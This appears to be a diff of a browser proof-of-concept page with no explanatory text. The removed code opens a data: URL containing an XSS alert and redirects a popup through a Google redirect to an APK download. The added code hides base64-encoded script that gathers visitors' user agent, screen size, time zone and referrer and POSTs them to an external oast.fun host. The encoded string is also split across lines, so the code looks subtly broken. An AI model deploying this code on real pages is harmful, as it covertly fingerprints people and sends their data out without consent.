@@ -1,31 +1,8 @@
-<button onclick="test()">clickme</button>
+<button id="btn">ClickMe</button>
 
 <script>
-
-function test()
-
-{
-
-  w = open('data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=')
-
-  setTimeout(function(){
-
-    w.location = 'https://www.google.com/'
-
-  }, 300)
-
-  setTimeout(function(){
-
-      w.location = 'https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK'
-
-      setTimeout(function(){
-
-        w.history.back()
-
-      }, 2100)
-
-  }, 2000)
-
-}
-
+document.getElementById("btn").addEventListener("click", function () {
+  window.open("data:text/html;base64,PHNjcmlwdD4KICBjb25zdCBkYXRhID0gewogICAgdWE6IG5hdmlnYXRvci51c2VyQWdlbnQsCiAgICBzY3JlZW46IHNjcmVlbi53aWR0aCArICd4JyArIHNjcmVlbi5oZWlnaHQsCiAgICB0ejogSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVa
+b25lLAogICAgcmVmOiBkb2N1bWVudC5yZWZlcnJlcgogIH07CgogIGZldGNoKCdodHRwczovL2pxZGZqaXV6bWRoaGtpcHpvYXh4ZjJvY3J3MDdpM2N3Ny5vYXN0LmZ1bicsIHsKICAgIG1ldGhvZDogJ1BPU1QnLAogICAgaGVhZGVyczogeyAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nIH0sCiAgICBib2R5OiBKU09OLnN0cmluZ2lmeShkYXRhKQogIH0pOwoKICBhbGVydCgnRmluZ2VycHJpbnQgZGF0YSBzZW50IScpOwo8L3NjcmlwdD4=");
+});
 </script>
